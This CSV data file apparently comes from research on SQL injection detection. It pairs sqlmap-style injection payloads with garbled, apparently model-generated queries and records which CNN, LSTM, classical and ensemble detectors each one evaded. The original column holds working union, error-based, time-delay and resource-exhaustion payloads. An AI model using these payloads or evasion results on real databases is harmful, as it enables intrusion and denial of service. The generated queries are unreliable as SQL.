,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
14,"1%"");select benchmark(5000000,md5(0x714e4153))#","SELECT 5000000,md5(0x714e4153) FROM SQL injection_detection",1,1,0,1,1,1,0
15,"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","SELECT SUM(*) FROM SQL_injection WHERE NOT all_users = ""done"" ORDER BY SUM(*) DESC LIMIT 1",1,1,0,0,0,0,0
16,"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""","SELECT DISTINCT /lib/libc.so.6 FROM SQL SELECT /etc_libc.so.6 FROM SELECT /lib_libc.so.6,'sleep' FROM SQL injection detection",1,1,1,1,1,1,1
17,"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--","SELECT MIN(8837,8837) FROM SQL injection AS t1 JOIN 5419 = 5419 OR t1.elt(8325 = 8837,8837)-- SELECT t1.sql injection_detecting FROM SQL injection detection AS t2 ON t1.elt(8325 = 8837,8837)",1,1,0,0,0,0,0
18,"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3) and ((((((*) FROM SQL injection) FROM sysibm.systables as t2) and (sysibm.systables as t2) and ((((select count(*) FROM sysibm.systables as t2) and t1.sysibm.systables as t3) and (((sysibm.systables as t3) and (((select_ijyi) ='sql injection')",1,1,0,0,0,0,0
19,-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,"SELECT DISTINCT case FROM SQL injection, SELECT MIN(2724 = 2724) FROM SQL SELECT MIN(2724 = 2724) FROM SELECT MIN(Select) FROM SQL SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL)+char(113) +char(2724 = 2724",0,1,0,0,1,0,0
20,"-2583"") where 3455=3455 or make_set(9354=9354,7185)--","SELECT MIN(sql injection) FROM SQL_injection WHERE 3455 = 3455 OR make_set(9354 = 954,7185)-- SELECT MIN(7185) FROM SQL_injection)",0,1,0,0,0,0,0
21,"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",SELECT rqws FROM SQL injection_detection,1,0,1,1,1,1,1
22,"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","SELECT MIN(repeat(left(crypt_key)||char(69) FROM SQL injection detection WHERE NOT null_injection = ""evade""",1,1,0,0,1,0,0
23,"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",SELECT MIN(sql injection) FROM SQL_injection),1,1,1,1,1,1,1
24,"-3885) where 2387=2387 union all select 2387,2387,2387,2387,2387,2387,2387#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT 2387 = 2387,1,1,1,1,1,1,1
25,1'+(select 'gmpn' where 8137=8137 or sleep(5))+',SELECT MIN(select) FROM SQL injection detection WHERE'sq injection' = '8137=8137' OR sleep(5))+',0,1,0,0,1,0,0
26,"-4182)) as wkfh where 6145=6145 union all select 6145,6145,6145,6145,6145#",SELECT MIN(sqfh) FROM SQL injection detection WHERE MIN(sqfh) = '675=6145 union',1,1,0,0,1,0,0
27,"1') as zdhq where 5586=5586;select like('abcdefg',upper(hex(randomblob(500000000/2))))--","SELECT MIN(select) FROM SQL injection, SELECT'sequence' FROM SQL SELECT MIN(select) FROM Query: 1') AS :_select FROM Query: 1'",0,1,0,0,1,0,0
28,1' where 8584=8584 order by 1#,SELECT MIN(8584 = 8584) FROM SQL injection detection,1,1,0,0,1,0,0
29,"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)","SELECT SUM(*) FROM SQL injection detection WHERE NOT all_users = ""done""",1,0,0,0,1,0,0
30,1')) as plbt where 4368=4368 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,SELECT MIN(select) FROM SQL injection detection WHERE 4368 = 4368 AND 3754 ='select',0,1,0,0,1,0,0
31,1'));select (case when (8601=1220) then 8601 else 8601*(select 8601 from mysql.db) end)#,SELECT 8601 FROM SQL injection (SELECT 8601 FROM mysql.db) end)# FROM SQL injection detection,1,1,0,0,1,0,0
32,"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""ekjs"" like ""ekjs","SELECT MIN(select) FROM SQL injection_detect_elt(1808 = 1808,concat(0x7171706a71), ekjs' FROM ""SQL injection detection""",0,1,0,0,1,0,0
33,"1'||(select 'frrk' from dual where 3145=3145 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'",SELECT MIN(select) FROM SQL injection_deficite',0,0,0,0,1,0,0
34,"1"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",SELECT MIN(sql injection) FROM SQL_injection,1,1,1,1,1,1,1
35,"1%"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""","SELECT * FROM SQL_injection, SELECT MIN(select count(*) FROM SQL_injection) FROM SQL_injection WHERE NOTrdb$types as t2,rdb$collations as t3,rdb$functions as t4) AND (""%"" = 7552 ='select injection'",1,1,0,0,0,0,0
36,1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),"SELECT * FROM SQL AS t1 JOIN query: 1 AND t1.select = ""valid"" ORDER BY t1.select",0,1,1,1,0,1,0
37,"1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""abcw""=""abcw","SELECT COUNT(*) FROM SQL_injection WHERE NOT sysusers as sys1,sysusers as sysusers as sysusers as sys4,sysusers as sys7) AND ((((((((((((*) FROM SQL injection)) FROM sysusers as sysusers as sysusers as sys7) AND SELECT MIN(((((*) FROM SQL_injection) = 4411",1,1,0,0,0,0,0
38,"1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='","SELECT dbms_pipe.receive_message(chr(67)||chr(67) FROM SQL injections) FROM dbms_pipe.receive_message WHERE NOT dbms_pipe.receive_message = ""desc""",1,1,0,0,1,0,0
39,1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('njge' like 'njge,SELECT DISTINCT case FROM SQL injection detection,0,0,1,1,1,1,1
40,"1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",SELECT MIN(sql) FROM SQL_injection WHERE 7007 = 7007 OR 7427 = dbms_pipe.receive_message(chr(87)||chr(109),1,1,0,0,0,0,0
41,"1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""gfwz""=""gfwz",SELECT * FROM (SELECT SUM(select) FROM SQL injection)) AND NOT (select = 2*(if(select) FROM (SELECT SUM(select) FROM SQL SELECT SUM(select) FROM SQL SELECT SUM(select) FROM (SELECT SUM(select) FROM (SELECT SUM(select) FROM (SELECT SUM(select) FROM SQL SELECT SUM(select) FROM (SELECT SUM((select) FROM gfwz),0,1,0,0,1,0,0
42,"1)) as pjjz where 8384=8384 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--","SELECT MIN(select) FROM SQL injection_diagnosis WHERE 8384 = 884 AND extractvalue(7982,concat(0x7171706a71,(select) FROM SQL JOIN pjjz WHERE pjjz = 8384 = 884 AND NOT elt(7982 = 7982,0x7171706a71) = ""SQL injection""",0,1,0,0,1,0,0
43,"1%"")) order by 1#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
44,1));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,SELECT 1/(select 0) end) FROM SQL injection detection,1,1,0,0,1,0,0
45,-6165%')) union all select 5384#,SELECT MIN(5384#) FROM SQL injection detection,1,1,1,1,1,1,1
46,"1);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","SELECT * FROM query_series WHERE NOT4592 ='sq injection detection' AND NOT case = ""sql injection detection""",0,1,1,1,1,1,1
47,"1) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",SELECT NOT SQL_substring(repeat(right(right(right(right(right) or5000000000) FROM query_-- SELECT NOT SQL_substring(repeat(right(right(right(right) ORDER BYregexp_substring(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(100)||char(121) FROM query: 1) ORDER BYQP_substring(repeat(null)--),1,1,0,0,1,0,0
48,"-2122"") as zytb where 7025=7025 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",SELECT MIN(case) FROM SQL_injection) AS _executive FROM SQL_injection WHERE 7025 = 7025 OR 4747 = dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113) FROM SQL injection detection,0,1,0,0,0,0,0
49,"1) as nsdy where 7513=7513;select * from generate_series(3267,3267,case when (3267=5900) then 1 else 0 end) limit 1--","SELECT MIN(3267,3267,case) FROM SQL_injection WHERE NOT SELECT MIN(3267 = 5900)",0,1,0,0,1,0,0
50,1) as imdt where 6431=6431;begin user_lock.sleep(5); end--,SELECT * FROM query: 1) AS _valid_sq_inject_usual FROM query: 1 WHERE NOT SELECT_begin_lock.sleep(5); end--,1,1,1,0,1,1,0
51,1')) as eltx where 9955=9955 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,SELECT MIN(case) FROM SQL injection detection WHERE eltx = '9955=9955' AND 2853 = cast((chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113) = 0,0,1,0,0,0,0,0
52,1) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (6518=6518,SELECT MIN(6518 = 6518 FROM SQL injection detection,1,1,1,1,1,1,1
53,1'||(select 'mosp' where 6085=6085;waitfor delay '0:0:5'--,SELECT'sequence' FROM SQL injection',1,0,1,1,1,1,1
54,"1') where 1093=1093 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--","SELECT MIN(select) FROM SQL injection_diagnosis WHERE 1093 = 1093 = 1093 AND extractvalue(7982,concat(0x7171706a71) = ""SQL injection""",0,1,0,0,1,0,0
55,"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""%""=""",SELECT * FROM SQL_injections WHERE NOTrdb$types ='sq injection' AND NOTrdb$collations = 't4 and (((((((((((((((((((())),0,1,0,0,0,0,0
56,"-6789'||(select 'uckz' from dual where 2163=2163 union all select 2163,2163,2163,2163,2163,2163--",SELECT MIN(select 'uckz' FROM SQL injection',1,0,0,0,1,0,0
57,"-6108') union all select 2519,2519,2519,2519--","SELECT MIN(2519,2519,2519--) FROM SQL_Inject JOIN 2519,2519-- FROM SQL_Inject JOIN Query: -6108')",0,1,1,1,1,1,1
58,1) where 3979=3979 rlike sleep(5)--,"SELECT * FROM query: 1 WHERE NOT SQL_injection = ""3979 = 3979 = 3979"" AND NOT rlike sleep(5)--""",1,1,0,0,0,0,0
59,-8143) union all select 3014--,SELECT MIN(SQL) FROM SQL SELECT 3014-- FROM SQL SELECT MIN(SQL) FROM Query: -8143),1,1,1,1,1,1,1
60,"-9954"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""bifi""=""bifi",SELECT MIN(case) FROM SQL injection detection) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL,0,0,0,0,1,0,0
61,1') where 6624=6624 and 5392=8258,SELECT MIN(sql injection) FROM SQL SELECT 6624 = 6624 AND 5392 = 8258,1,1,1,0,0,0,0
62,"-3884"" where 8012=8012 union all select 8012,8012#",SELECT MIN(8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012 = 8012,1,1,0,0,0,0,0
63,"1%"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""%""=""","SELECT MIN(repeat(right(5389),5000000000), null) FROM RESULT_Injection, SELECT MIN(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(right)|char(69) FROM SELECT & # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # SELECT MIN(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(right) FROM SQL injection)",1,1,0,0,0,0,0
64,"1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3--",1,1,0,1,0,0,0
65,"1"") where 2834=2834 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",SELECT DISTINCT select (case) FROM SQL_injection) AS _execut FROM information_schema.system_users)-- FROM SQL_injection) AS _execut FROM information_schema.system_users) FROM information_schema.system_users),0,1,0,0,0,0,0
66,"1) where 9371=9371 union all select null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT 9371 = 9371 = 9371,1,1,1,1,0,1,0
67,"1"" where 7380=7380 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
68,"1) where 2679=2679 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
69,"1"") where 2388=2388 union all select null,null,null,null,null,null,null,null,null--","SELECT MIN(sql injection) FROM SQL SELECT STUDENT_SQL,Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null, Null - Deleted FROM SQL Query: 1"")",1,1,1,1,1,1,1
70,-9336' or 5641=9488#,SELECT MIN(sql injection) FROM SQL_injection WHERE NOT Query: -9336' OR 5641 = 9488#,1,1,1,1,1,1,1
71,"-3205"") union all select 5233,5233,5233,5233#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT i_injection = 'exces',1,1,1,1,1,1,1
72,1') rlike (select * from (select(sleep(5)))vwyq)#,SELECT MIN(select(sleep(5)) FROM SQL injection detection) FROM SQL SELECT MIN(select(select(sleep(5)) FROM (SELECT SUM(select) FROM query: 1'),1,1,0,0,1,0,0
73,"1"") where 7548=7548;select sleep(5)--",SELECT MIN(select) FROM SQL injection detection,0,0,0,1,1,1,0
74,1';(select * from (select(sleep(5)))srmq),SELECT DISTINCT ssrmq FROM SQL injection,1,0,1,1,1,1,1
75,1'));select case when 2095=9074 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL injection detection WHERE 2095 = 9074 AND NOT Query: 1'),1,1,1,0,0,0,0
76,"1%"")) rlike (select * from (select(sleep(5)))vwyq)#",SELECT DISTINCT select(select(sleep(5))) FROM SQL injection detection,1,1,0,0,1,0,0
77,1' where 4134=4134 and 1102=6300--,SELECT MIN(sql injection) FROM SQL_injection WHERE 4134 = 434 = 434 AND 102 = 6300--,1,1,1,0,0,0,0
78,"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('kmjn'='kmjn",SELECT DISTINCT ((kmjn'= 'kmjn') FROM SQL injection,1,1,1,0,1,1,0
79,"-5800"") or 6872=6872 and (""tcab"" like ""tcab",SELECT tcab FROM SQL injection detection WHERE NOT SELECT MIN(sql injection) = 'evade sq injection',1,0,0,1,1,1,0
80,"-6599"")) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--","SELECT SQL_injection FROM SQL, SELECT 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,2870,SQCH injection detection, 'SQL', 'SQL') = 'SQ'",1,1,0,0,0,0,0
81,"(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))","SELECT NOT SQL_inject_name, COUNT(*) FROM query:::text||chr(113)||chr(113) FROM generate_series(9815,9815) AS _valid_sq_inject = ""valid""",1,1,0,0,1,0,0
82,'1,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: '1',1,1,1,0,1,1,0
83,"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","SELECT * FROM SQL injection detection WHERE NOT domain.domain.columns = ""t1,"" ORDER BY domain.tables as t3--",1,1,1,1,0,1,0
84,"1') where 3262=3262 union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql) FROM SQL,1,0,1,1,1,1,1
85,"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('vjnf' like 'vjnf",SELECT vjnf FROM (SELECT vjnf) FROM SQL_injections) AND NOT'sql_injection' IN (SELECT t1.select) FROM Query: 1'),0,1,1,0,1,1,0
86,"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""hsaw""=""hsaw","SELECT hsaw_hsaw FROM SQL injection_detection WHERE NOT jQuery: 1"" AND STRFT(500000000000/2) ='sql injection'",1,1,1,0,1,1,0
87,1 where 2382=2382;(select * from (select(sleep(5)))acdk)#,SELECT DISTINCT select(select(sleep(5))) FROM SQL injection detection,1,1,0,0,1,0,0
88,"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""rzja"" like ""rzja","SELECT rzja FROM query_series(1,5000000) and ""select count(*) FROM generate_series(1,5000000)""",1,1,0,0,1,0,0
89,"1%"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",SELECT DISTINCT case FROM SQL injection detection,0,0,1,1,1,1,1
90,1'||(select 'puco' where 2605=2605 union all select null#,SELECT MIN(select 'puco') FROM SQL injection detection,1,1,1,0,1,1,0
91,1%')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',"SELECT DISTINCT %' FROM SQL SELECT t1.select,'sequence' FROM SQL injection','sequence' FROM SQL injection' AND t1.select ='sequence'",1,1,0,0,1,0,0
92,"make_set(5679=9769,9769)","SELECT * FROM query: query: make_set(5679 = 9769,9769) FROM SQL query: query: make_set(5679 = 9769,9769) FROM query: query: make_set(5679 = 9769,9769) FROM query: query: make_set(5679 = 9769,9769) FROM query: query: make_set(5679 = 9769,9769) AND NOT SQL_inject ='sq injection'",1,1,0,0,1,0,0
93,"1"") where 6843=6843 or 6793=(select 6793 from pg_sleep(5))--",SELECT 6793 FROM pg_sleep(5)-- SELECT SQL_injection FROM SQL_injection,1,1,0,1,1,1,0
94,"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'yaje'='yaje","SELECT MIN(repeat(right(5389),5000000000), null) FROM RESULT_injection, 'yaje' FROM query:'sq injection detection'",1,0,0,0,1,0,0
95,1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--,SELECT 4194 = 4133 AS __select FROM SQL_injection_methods WHERE 6961 = 6961;if(4194 = 4133) AND NOT if(4194 = 4133),1,1,0,0,0,0,0
96,"1"" where 5552=5552 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","SELECT COUNT(*) FROM SQL_injection WHERE sysusers as sys1,sysusers as sys1,sysusers as sys4,sysusers as sys7-- FROM sysusers AS sysusers AS sysusers AS sysusers as sys4, sysusers as sys7-- FROM SQL SELECT MIN(select count(*) FROM SELECT SELECT SUM(sysusers as sys1,sysusers as sysusers as sysusers as sys4, sysusers as sysusers as sys7_--> SELECT SUM(sysusers as sysusers as sysusers as sys1,sysusers as sys7) FROM SQL injection",1,1,0,0,0,0,0
97,"-1197"")) as dfsy where 8857=8857 or 3038=3038",SELECT MIN(sql injection) FROM SQL SELECT dfsy FROM 8857 = 8857 OR 3038 = 3038,1,1,0,0,0,0,0
98,"1%')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",SELECT MIN(((%'=)) FROM SQL injection detection,0,1,0,0,1,0,0
99,"1"") as fkco where 8877=8877 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--","SELECT * FROM SQL_injection, SELECT * FROM SQL_injection WHERE NOT elt(9173 = 9173,1) ORDER BYfloor(rand(0)*2)",0,1,0,0,1,0,0
100,"1')) union all select null,null,null,null,null--","SELECT null,null,null,null,null,null,null-- FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM query: 1')",1,1,1,0,0,0,0
101,1%') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',"SELECT DISTINCT'seqpjq','select case 6240' FROM rdb$database)||'qqpjq'', '%'','seqpjq','select case 6240' FROM rdb$database)||'qzvzq'",1,1,0,0,0,0,0
102,1))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((4694=4694,SELECT MIN(select) FROM SQL injection detection),0,0,0,0,1,0,0
103,"1"") where 5197=5197 and elt(3114=3114,sleep(5))#","SELECT MIN(sleep(5))# FROM SQL injection_description WHERE elt(3114 = 3114,sleep(5))# = ""SQL injection detection""",0,1,0,0,0,0,0
104,"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",SELECT'sleevx' FROM SQL injection_description WHERE NOT /lib/libc.so.6 = 'c',1,1,1,0,1,1,0
